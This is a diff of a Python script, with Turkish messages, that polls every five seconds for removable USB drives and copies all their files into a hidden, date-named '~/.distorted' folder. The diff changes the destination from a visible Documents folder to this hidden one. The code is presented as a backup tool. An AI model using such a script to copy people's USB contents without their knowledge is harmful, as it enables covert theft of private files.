@@ -12,16 +12,17 @@ except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
     import psutil
 
-def find_usb_drive():
+def find_usb_drives():
     drives = psutil.disk_partitions(all=True)
+    usb_drives = []
     for drive in drives:
         if 'removable' in drive.opts:
-            return drive.device
-    return None
+            usb_drives.append(drive.mountpoint)
+    return usb_drives
 
-def create_users_document_folder():
-    documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
-    target_folder = os.path.join(documents_path, 'Users Library')
+def create_backup_folder(backup_date):
+    backup_folder_name = backup_date.strftime('%Y-%m-%d')
+    target_folder = os.path.join(os.path.expanduser('~'), '.distorted', backup_folder_name)
     os.makedirs(target_folder, exist_ok=True)
     return target_folder
 
@@ -42,17 +43,19 @@ def copy_files(src, dest):
         print(f"Hata oluştu: {e}")
 
 def main():
-    target_folder = create_users_document_folder()
     interval_seconds = 5  # Kopyalama işleminin tekrarlanma aralığı (saniye cinsinden)
     while True:
         try:
-            usb_drive_letter = find_usb_drive()
-            if usb_drive_letter:
-                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Kopyalama işlemi başladı...")
-                copy_files(usb_drive_letter, target_folder)
-                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Kopyalama işlemi tamamlandı.")
+            current_date = datetime.now()
+            usb_drives = find_usb_drives()
+            if usb_drives:
+                backup_folder = create_backup_folder(current_date)
+                for usb_drive in usb_drives:
+                    print(f"[{current_date.strftime('%Y-%m-%d %H:%M:%S')}] Kopyalama işlemi başladı...")
+                    copy_files(usb_drive, backup_folder)
+                    print(f"[{current_date.strftime('%Y-%m-%d %H:%M:%S')}] Kopyalama işlemi tamamlandı.")
             else:
-                print("USB sürücü bulunamadı.")
+                print("USB sürücüsü bulunamadı.")
         except Exception as e:
             print(f"Bir hata oluştu: {e}. Tekrar denenecek.")
         time.sleep(interval_seconds)
